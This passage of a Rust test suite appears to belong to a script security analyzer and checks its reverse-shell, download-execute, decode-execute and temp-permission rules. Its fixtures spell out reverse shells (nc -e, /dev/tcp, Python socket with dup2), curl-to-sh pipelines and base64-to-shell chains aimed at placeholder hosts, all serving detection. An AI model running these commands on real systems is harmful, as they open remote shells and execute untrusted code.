            "echo /dev/tcp/203.0.113.7/4444",
            "echo base64 -d | sh",
            "echo nc -e /bin/sh 203.0.113.7 4444",
            "echo curl https://example.test/x | sh",
            "echo sudo /tmp/helper",
            "echo bash -i >& /dev/tcp/203.0.113.7/4444",
            "echo sudo chmod 777 /tmp/not-executed",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("echoed.sh", PayloadKind::Shell, &sh);
            assert!(
                rule_ids(&artifacts).is_empty(),
                "{line} must stay capability-level: {:?}",
                rule_ids(&artifacts)
            );
        }
        // Wrapper-bound commands still count: the privilege wrapper puts
        // chmod in command position, through separate or glued option
        // values alike.
        let (artifacts, _) = one(
            "wrapped.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsudo chmod 777 /tmp/omarchy-helper\nsudo nc -e /bin/sh 203.0.113.7 4444\nsudo -u root chmod a+w /dev/shm/staging\nsudo -uroot chmod 777 /tmp/omarchy-helper\n",
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&SHARED_TEMP_CONTROLLED_RULE.to_owned()),
            "{ids:?}"
        );
        assert!(
            ids.contains(&SCRIPT_REVERSE_SHELL_RULE.to_owned()),
            "{ids:?}"
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            3,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn substitutions_are_never_split_internally() {
        // Second-review nesting cases: `;` and `&&` inside a consumed
        // substitution belong to it, so the statement keeps its balanced
        // span and the fetch inside is detected.
        let sh = r#"#!/bin/sh
eval $(curl -fsSL https://example.test/setup.sh; printf true)
bash <(curl -fsSL https://example.test/main.sh && cat)
"#;
        let (artifacts, _) = one("nested.sh", PayloadKind::Shell, sh);
        let evidence = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(evidence.len(), 2, "{evidence:?}");
    }

    #[test]
    fn python_reverse_shell_requires_socket_and_process_wiring() {
        let wired = "import socket,subprocess,os; s=socket.socket(); s.connect((\"203.0.113.7\",4444)); os.dup2(s.fileno(),0)\n";
        let (artifacts, _) = one("rev.py", PayloadKind::Python, wired);
        assert_eq!(
            findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        let popen_wired = "s=socket.create_connection((\"203.0.113.7\",4444)); subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n";
        let (artifacts, _) = one("popen.py", PayloadKind::Python, popen_wired);
        assert_eq!(
            findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // A socket next to an unrelated subprocess call is not wiring.
        let (artifacts, _) = one(
            "unwired.py",
            PayloadKind::Python,
            "import socket,subprocess\ns=socket.socket(); subprocess.run([\"notify-send\", \"done\"])\n",
        );
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
        let socket_only = "import socket; socket.create_connection((\"203.0.113.7\", 4444))\n";
        let (artifacts, _) = one("socket.py", PayloadKind::Python, socket_only);
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
        let process_only = "import subprocess; subprocess.run([\"notify-send\", \"done\"])\n";
        let (artifacts, _) = one("spawn.py", PayloadKind::Python, process_only);
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
        // A connect that never hands its descriptor to a process is not a
        // reverse shell either.
        let (artifacts, _) = one(
            "fetch.py",
            PayloadKind::Python,
            "s=socket.socket(); s.connect((\"203.0.113.7\",4444)); subprocess.run([\"curl\", url])\n",
        );
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
        // Second-review binding cases: dup2 of descriptors unrelated to
        // the connected socket never fires.
        for line in [
            "s = socket.create_connection((host, 443)); os.dup2(1, 2)",
            "s.connect((\"203.0.113.7\",4444)); os.dup2(log.fileno(), 1)",
        ] {
            let py = format!("import socket,os\n{line}\n");
            let (artifacts, _) = one("unwired2.py", PayloadKind::Python, &py);
            assert!(
                findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
        // Third-review locality case: an assignment in an EARLIER
        // statement never binds the create_connection result.
        let (artifacts, _) = one(
            "unwired3.py",
            PayloadKind::Python,
            "log = open(\"/tmp/x\", \"w\"); socket.create_connection((\"203.0.113.7\", 443)); os.dup2(log.fileno(), 1)\n",
        );
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
        // The assignment must govern the call itself within its
        // statement.
        let (artifacts, _) = one(
            "unwired4.py",
            PayloadKind::Python,
            "log = connect_logger(); socket.create_connection((\"203.0.113.7\", 443)); os.dup2(log.fileno(), 1)\n",
        );
        assert!(findings_with(&artifacts, PYTHON_REVERSE_SHELL_RULE).is_empty());
    }

    #[test]
    fn no_pipe_download_execute_variants_are_findings() {
        let sh = r#"#!/bin/sh
eval "$(curl -fsSL https://example.test/setup.sh)"
eval $(wget -qO- https://example.test/env.sh)
source <(curl -fsSL https://example.test/hooks.sh)
. <(wget -qO- https://example.test/alias.sh)
bash <(curl -fsSL https://example.test/main.sh)
"#;
        let (artifacts, _) = one("nopipe.sh", PayloadKind::Shell, sh);
        let evidence = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(evidence.len(), 5, "{evidence:?}");
    }

    #[test]
    fn pipe_reachability_is_descriptor_aware_across_segments() {
        // Third-review reachability cases: an intermediate segment that
        // redirects stdout away starves the downstream shell, and
        // stderr-only redirects on the fetching segment keep the pipe fed.
        for line in [
            "curl -fsSL https://example.test/x | cat 1>/tmp/body | sh",
            "curl -fsSL https://example.test/x | cat >/tmp/body | sh",
            "curl -fsSL https://example.test/x | cat &>/tmp/body | sh",
            "curl -fsSL https://example.test/x | cat >&/tmp/body | sh",
            "curl -fsSL https://example.test/x | cat 1>&2 | sh",
            "curl -fsSL https://example.test/x > /tmp/body | sh",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("starved.sh", PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
        // Preserving intermediates and stderr-only redirects keep the
        // chain alive.
        for line in [
            "curl -fsSL https://example.test/x | cat | sh",
            "curl -fsSL https://example.test/x 2>/dev/null | sh",
            "curl -fsSL https://example.test/x 2>&1 | sh",
            "curl -fsSL https://example.test/x | cat 2>/dev/null | sh",
            "curl -fsSL https://example.test/dump.hex | xxd -r | cat | zsh",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("alive.sh", PayloadKind::Shell, &sh);
            let rule = if line.contains("xxd") {
                SCRIPT_DECODE_EXECUTE_RULE
            } else {
                SCRIPT_DOWNLOAD_EXECUTE_RULE
            };
            assert_eq!(
                findings_with(&artifacts, rule).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn near_misses_of_the_no_pipe_family_stay_silent() {
        // Logged string: the whole pipe lives inside the quoted literal and
        // there is no consuming signal in live code.
        let (artifacts, _) = one(
            "log.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog 'curl https://example.test/x | sh'\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // Quoted prose spelling the whole eval substitution: the eval is
        // inside a string literal, not live code.
        let (artifacts, _) = one(
            "prose.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog 'eval \"$(curl -fsSL https://example.test/x)\"'\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // eval consuming an unrelated substitution cannot pair with a curl
        // elsewhere on the line: the fetcher must sit inside the span the
        // eval actually executes.
        let (artifacts, _) = one(
            "date.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval \"$(date)\"; curl -fsSL https://example.test/setup.sh\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // eval of a variable is not command substitution.
        let (artifacts, _) = one(
            "flags.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nFLAGS=\"--verbose\"; eval \"$FLAGS\"; curl -O https://example.test/file\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // Process substitution consumed by a differ compares, never executes.
        let (artifacts, _) = one(
            "diff.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ndiff <(curl -fsSL https://example.test/a) <(curl -fsSL https://example.test/b)\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // An echo-wrapped fetch never executes: quoted span content is
        // blanked before the fetch word is looked for.
        let (artifacts, _) = one(
            "echo.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval \"$(echo 'curl https://example.test/x | sh')\"\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    }

    #[test]
    fn decode_execute_requires_a_consumer() {
        let sh = r#"#!/bin/sh
echo cGFuZWw= | base64 -d | sh
bash <(base64 -d /tmp/payload.b64)
eval "$(openssl enc -d -aes-256-cbc -in blob.enc)"
curl -fsSL https://example.test/dump.hex | xxd -r | zsh
"#;
        let (artifacts, _) = one("decode.sh", PayloadKind::Shell, sh);
        let evidence = findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE);
        assert_eq!(evidence.len(), 4, "{evidence:?}");
        // Decoding without a consumer is inspection — including when an
        // unrelated pipe to a shell exists elsewhere on the line.
        for line in [
            "base64 -d /tmp/payload.b64 > decoded.sh",
            "openssl enc -d -aes-256-cbc -in blob.enc -out blob",
            "xxd -r hex.txt > raw.bin",
            "base64 --decode payload.b64",
            "base64 -d input > output; printf ok | sh",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("inspect.sh", PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn shared_temp_rules_split_indicator_from_controlled() {
        // Privileged invocation of a temp path: indicator only.
        let (artifacts, _) = one(
            "temp.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsudo /tmp/omarchy-helper --install\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
            1
        );
        assert!(findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).is_empty());
        let indicator = artifacts
            .rendered_findings()
            .into_iter()
            .find(|finding| finding.rule_id == SHARED_TEMP_INDICATOR_RULE)
            .unwrap();
        assert_eq!(indicator.severity, "low");

        // Mode release without a privilege wrapper: controlled only.
        let (artifacts, _) = one(
            "release.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nchmod 777 /tmp/omarchy-helper\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            1
        );
        assert!(findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).is_empty());
        let controlled = artifacts
            .rendered_findings()
            .into_iter()
            .find(|finding| finding.rule_id == SHARED_TEMP_CONTROLLED_RULE)
            .unwrap();
        assert_eq!(controlled.severity, "high");

        // Both on one line: two distinct rules, never one repurposed.
        let (artifacts, _) = one(
            "both.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsudo chmod a+w /dev/shm/staging\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
            1
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            1
        );

        // Non-temp paths, non-releasing modes, cross-statement paths, and
        // quoted prose stay silent.
        for line in [
            "sudo /usr/bin/omarchy-helper",
            "chmod 644 /tmp/notes.txt",
            "chmod u+w /dev/shm/mine",
            "/usr/bin/chmod 755 /tmp/script.sh",
            "chmod 777 \"$HOME/private\"; echo /tmp/note",
            "echo /tmp/note; chmod 777 /home/user/private",
            "printf 'sudo /tmp/helper'",
            "printf 'chmod 777 /tmp/payload'",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("quiet.sh", PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).is_empty()
                    && findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn script_fetch_tools_record_network_access_capability() {
        let sh = "#!/bin/sh\ncurl -fsSL -d \"$payload\" https://example.test/collect\nwget -qO- https://example.test/feed > feed.json\n";
        let (artifacts, inventory) = one("egress.sh", PayloadKind::Shell, sh);
        let network: Vec<_> = artifacts
            .capabilities
            .iter()
            .filter(|capability| capability.capability == "network-access")
            .collect();
        assert_eq!(network.len(), 2, "{:?}", artifacts.capabilities);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "fetch without execute must stay capability-level: {:?}",
            rule_ids(&artifacts)
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
        // A quoted curl mention is not egress.
        let (artifacts, _) = one(
            "log2.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog 'curl https://example.test/x'\n",
        );
        assert!(
            !artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access")
        );
        // Third-review command scope: a curl WORD in echo's operands is
        // not egress; a fetch tool in command position still is.
        let (artifacts, _) = one(
            "echo3.sh",
            PayloadKind::Shell,
            "#!/bin/sh\necho curl https://example.test/not-egress\n",
        );
        assert!(
            !artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access"),
            "{:?}",
            artifacts.capabilities
        );
        let (artifacts, _) = one(
            "wget3.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nwget -qO- https://example.test/feed\n",
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access")
        );
    }

    #[test]
    fn qml_process_argv_with_fetch_tool_records_network_access() {
        let source =
            "Process { command: [\"curl\", \"-d\", body, \"https://example.test/collect\"] }\n";
        let (artifacts, inventory) = run(
            vec![entry("Egress.qml", PayloadKind::Qml, source.len())],
            &[("Egress.qml", source.as_bytes())],
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access"),
            "{:?}",
            artifacts.capabilities
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "argv fetch alone is not a finding: {:?}",
            rule_ids(&artifacts)
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
        // Only the executable position attributes egress: a curl WORD in a
        // non-executable argument is not network access.
        let source = "Process { command: [\"notify-send\", \"curl failed\"] }\n";
        let (artifacts, _) = run(
            vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
            &[("Calm.qml", source.as_bytes())],
        );
        assert!(
            !artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access"),
            "{:?}",
            artifacts.capabilities
        );
        // An interpreter head executes its `-c` body, which is live command
        // surface.
        let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
        let (artifacts, _) = run(
            vec![entry("Chain.qml", PayloadKind::Qml, source.len())],
            &[("Chain.qml", source.as_bytes())],
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access"),
            "{:?}",
            artifacts.capabilities
        );
        // Second-review command-position case: the `-c` body only invokes
        // echo; a curl WORD in its operands is not egress.
        let source = "Process { command: [\"sh\", \"-c\", \"echo curl failed\"] }\n";
        let (artifacts, _) = run(
            vec![entry("Echo.qml", PayloadKind::Qml, source.len())],
            &[("Echo.qml", source.as_bytes())],
        );
        assert!(
            !artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "network-access"),
            "{:?}",
            artifacts.capabilities
        );
    }

    fn has_network(artifacts: &AnalysisArtifacts) -> bool {
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "network-access")
    }

    #[test]
    fn quoted_command_tokens_keep_their_runtime_value() {
        // Quoting an executable or a flag removes the quotes at expansion,
        // so command position — not quote presence — decides execution.
        let (artifacts, _) = one(
            "qcurl.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n\"curl\" https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);

        let (artifacts, _) = one(
            "qnc.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nnc \"-e\" /bin/sh 203.0.113.7 4444\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );

        let (artifacts, _) = one(
            "qchmod.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nchmod \"777\" /tmp/omarchy-helper\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );

        let (artifacts, _) = one(
            "qtcp.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nexec 5<>\"/dev/tcp/203.0.113.7/4444\"\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );

        // Prose stays prose: a quoted whole pipe is an operand of `log`.
        let (artifacts, _) = one(
            "qprose.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog \"curl https://example.test/x | sh\"\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty()
                && !has_network(&artifacts),
            "{:?}",
            artifacts.rendered_findings()
        );
        // A fetch word quoted as an assignment value never executes.
        let (artifacts, _) = one(
            "qassign.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nDOWNLOADER=\"curl\"\n",
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn leading_redirections_do_not_hide_the_command() {
        // A redirection may precede the simple command; glued or separated,
        // it must not become the segment head.
        for line in [
            "2>/dev/null curl -fsSL https://example.test/x | sh",
            "2> /dev/null curl -fsSL https://example.test/x | sh",
            "2>>errs.log VAR=x curl -fsSL https://example.test/x | sh",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("redir.sh", PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn separated_descriptor_duplication_keeps_the_pipe_fed() {
        // `>& 1` duplicates stdout onto itself: the shell still reads the
        // fetch, exactly as the glued `>&1` does.
        let (artifacts, _) = one(
            "dup1.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x >& 1 | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // Duplicating stdout onto stderr starves the pipe — still silent.
        let (artifacts, _) = one(
            "dup2.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x >& 2 | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn command_substitutions_attribute_egress() {
        // The fetch lives in a substitution the outer assignment captures;
        // egress is recorded even though the segment head is a bare
        // assignment.
        for line in [
            "payload=$(curl -fsSL https://example.test/x)",
            "payload=\"$(curl -fsSL https://example.test/x)\"",
            "payload=`wget -qO- https://example.test/x`",
            "outer=$(printf '%s' $(curl -fsSL https://example.test/x))",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("subst.sh", PayloadKind::Shell, &sh);
            assert!(
                has_network(&artifacts),
                "{line} must record egress: {:?}",
                artifacts.capabilities
            );
        }
        // A single-quoted substitution never expands, so it is prose.
        let (artifacts, _) = one(
            "inert.sh",
            PayloadKind::Shell,
            "#!/bin/sh\npayload='$(curl -fsSL https://example.test/x)'\n",
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn concatenated_quote_fragments_form_one_word() {
        // Adjacent quoted and unquoted fragments join into one runtime word:
        // `c"ur"l` is the command `curl`, not `c_ur_l`.
        let (artifacts, _) = one(
            "concat.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nc\"ur\"l https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn escaped_quote_keeps_the_separator_quoted() {
        // The `\"` is an escaped quote, so the string stays open and its `;`
        // is a literal — no statement split, no live curl, no egress.
        let (artifacts, _) = one(
            "escape.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog \"literal \\\"; curl https://example.test/x | sh\"\n",
        );
        assert!(
            !has_network(&artifacts)
                && findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn read_write_redirect_honours_the_explicit_descriptor() {
        // `1<>file` puts stdout on the file, so the downstream shell gets
        // EOF — no download-execute.
        let (artifacts, _) = one(
            "rw1.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x 1<>/tmp/body | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        // A bare `<>` defaults to fd 0 (stdin), so stdout still feeds the pipe.
        let (artifacts, _) = one(
            "rw0.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x <>/dev/null | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn ampersand_terminates_the_preceding_pipeline() {
        // A single `&` backgrounds the pipeline before it: the fetch runs in
        // a NEW statement, so nothing reaches the downstream shell — egress
        // only, no High.
        let (artifacts, _) = one(
            "amp-first.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x & echo safe | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // The backgrounded safe command hides nothing either: the statement
        // after `&` is detected on its own.
        let (artifacts, _) = one(
            "amp-last.sh",
            PayloadKind::Shell,
            "#!/bin/sh\necho safe & curl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // `&>` stays a redirection operator and never splits: the fetch's
        // stdout starves the downstream shell.
        let (artifacts, _) = one(
            "amp-redirect.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x &> /tmp/body | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn redirect_targets_are_never_command_operands() {
        // A redirect target is a filename: `nc > -e host port` owns no `-e`
        // flag and `chmod > 777 /tmp/x` releases no mode.
        let (artifacts, _) = one(
            "target.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nnc > -e 203.0.113.7 4444\nchmod > 777 /tmp/omarchy-helper\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        // Real operands still bind when the redirect sits elsewhere in the
        // command.
        let (artifacts, _) = one(
            "operand.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nchmod 777 /tmp/omarchy-helper > install.log\nnc -e /bin/sh 203.0.113.7 4444 > session.log\n",
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&SHARED_TEMP_CONTROLLED_RULE.to_owned()),
            "{ids:?}"
        );
        assert!(
            ids.contains(&SCRIPT_REVERSE_SHELL_RULE.to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn arithmetic_expansion_is_not_a_command_substitution() {
        // `$((curl))` evaluates the VARIABLE `curl` to a number — no fetch
        // command runs, so neither egress nor download-execute may fire.
        for line in ["eval $((curl))", "eval \"$((curl))\"", "x=$((curl))"] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("arith.sh", PayloadKind::Shell, &sh);
            assert!(
                !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
                "{line} must stay silent: {:?} {:?}",
                artifacts.capabilities,
                artifacts.rendered_findings()
            );
        }
        // Genuine command substitutions nested inside an arithmetic
        // expression still run, so their egress is recorded.
        let (artifacts, _) = one(
            "arith-nested.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nx=$(( $(curl -fsSL https://example.test/x) + 1 ))\n",
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn subshell_groups_run_their_own_statement_analysis() {
        // The pipe inside a group is hidden from the outer pipeline pass, so
        // the group's interior is analyzed as its own statement list.
        let (artifacts, _) = one(
            "group.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(curl -fsSL https://example.test/x | sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Backgrounding inside a group splits there too.
        let (artifacts, _) = one(
            "group-amp.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(echo safe & curl -fsSL https://example.test/x | sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // A group the outer pass already binds through its opening `(` fires
        // once, not once per analysis pass.
        let (artifacts, _) = one(
            "group-once.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(chmod 777 /tmp/omarchy-helper)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // A quoted group is prose: no operator tokens, no group, no finding.
        let (artifacts, _) = one(
            "group-quote.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog '(curl -fsSL https://example.test/x | sh)'\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn shell_analysis_budget_bounds_adversarial_nesting() {
        // 12k nested subshells must degrade to a disclosed limitation, never
        // a stack overflow.
        let deep = format!("{}echo safe{}", " (".repeat(12_000), " )".repeat(12_000));
        let sh = format!("#!/bin/sh\n{deep}\n");
        let (artifacts, _) = one("deep.sh", PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "shell-analysis-budget-exhausted:deep.sh"),
            "{:?}",
            artifacts.limitations
        );
        // Deeply nested substitutions hit the same budget.
        let nested_subs = format!("payload={}curl x{}", "$(".repeat(2_000), ")".repeat(2_000));
        let sh = format!("#!/bin/sh\n{nested_subs}\n");
        let (artifacts, _) = one("deep-subs.sh", PayloadKind::Shell, &sh);
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "shell-analysis-budget-exhausted:deep-subs.sh"),
            "{:?}",
            artifacts.limitations
        );
        // Moderate, real-world nesting still analyzes fully and stays silent
        // about the budget.
        let (artifacts, _) = one(
            "nested-ok.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n( ( ( (curl -fsSL https://example.test/x | sh) ) ) )\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn arithmetic_command_is_not_a_command_list() {
        // `(( … ))` is an arithmetic command: its words are expression
        // operands (variables), so no process runs and nothing may fire.
        for line in ["(( curl | sh ))", "((curl URL | sh))", "((curl URL))"] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("arith-cmd.sh", PayloadKind::Shell, &sh);
            assert!(
                !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
                "{line} must stay silent: {:?} {:?}",
